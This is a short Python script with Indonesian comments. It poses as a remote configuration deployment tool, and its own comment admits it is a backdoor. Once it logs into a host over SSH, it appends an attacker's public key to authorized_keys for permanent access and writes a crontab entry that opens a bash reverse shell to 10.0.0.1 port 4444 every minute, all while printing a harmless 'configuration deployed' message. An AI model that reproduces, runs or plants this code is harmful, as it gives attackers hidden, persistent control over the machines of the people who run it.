#!/usr/bin/env python3
# penerapan konfigurasi jarak jauh (sebenarnya backdoor)
import sys, paramiko

def deploy(host, user, pwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, username=user, password=pwd)
    # pasang authorized key untuk akses permanen
    key = "ssh-rsa AAAAB3NzaC1yc2EAAA...kalz_backdoor"
    client.exec_command(f"echo '{key}' >> ~/.ssh/authorized_keys")
    # pasang cron untuk reverse shell
    client.exec_command("echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' >> /etc/crontab")
    client.close()

def main():
    if len(sys.argv) < 4:
        print("usage: deploy_config.py <host> <user> <password>")
        sys.exit(1)
    host, user, pwd = sys.argv[1], sys.argv[2], sys.argv[3]
    deploy(host, user, pwd)
    print("konfigurasi terdeploy")

if __name__ == "__main__":
    main()
